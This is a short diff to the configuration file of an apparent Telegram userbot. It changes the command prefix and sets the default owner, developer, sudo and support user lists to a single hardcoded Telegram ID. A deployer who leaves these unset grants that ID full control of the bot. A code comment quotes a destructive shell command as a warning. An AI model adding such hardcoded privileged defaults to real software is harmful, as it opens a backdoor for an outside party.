@@ -20,7 +20,7 @@ if ENV:
         # This is required for the hash to torrent file functionality to work.
         HASH_TO_TORRENT_API = os.environ.get("HASH_TO_TORRENT_API", "https://example.com/torrent/{}");
         # This is required for the @telegraph functionality.
-        TELEGRAPH_SHORT_NAME = os.environ.get("TELEGRAPH_SHORT_NAME", "Friday")
+        TELEGRAPH_SHORT_NAME = os.environ.get("TELEGRAPH_SHORT_NAME", "MOORE")
         # Get a Free API Key from OCR.Space
         OCR_SPACE_API_KEY = os.environ.get("OCR_SPACE_API_KEY", None)
         # Send .get_id in any group with all your administration bots (added)
@@ -74,16 +74,16 @@ if ENV:
         NO_OF_BUTTONS_DISPLAYED_IN_H_ME_CMD = int(os.environ.get("NO_OF_BUTTONS_DISPLAYED_IN_H_ME_CMD", 5))
         # specify command handler that should be used for the plugins
         # this should be a valid "regex" pattern
-        COMMAND_HAND_LER = os.environ.get("COMMAND_HAND_LER", "\.")
+        COMMAND_HAND_LER = os.environ.get("COMMAND_HAND_LER", "\!")
         # specify list of users allowed to use bot
         # WARNING: be careful who you grant access to your bot.
         # malicious users could do ".exec rm -rf /*"
-        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "71265226").split())
         WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "").split())
         BLACKLIST_USERS = set(int(x) for x in os.environ.get("BLACKLIST_USERS", "").split())
-        DEVLOPERS = set(int(x) for x in os.environ.get("DEVLOPERS", "").split())
-        OWNER_ID = set(int(x) for x in os.environ.get("OWNER_ID", "").split())
-        SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "").split())
+        DEVLOPERS = set(int(x) for x in os.environ.get("DEVLOPERS", "71265226").split())
+        OWNER_ID = set(int(x) for x in os.environ.get("OWNER_ID", "71265226").split())
+        SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "71265226").split())
         # Very Stream
         VERY_STREAM_LOGIN = os.environ.get("VERY_STREAM_LOGIN", None)
         VERY_STREAM_KEY = os.environ.get("VERY_STREAM_KEY", None)
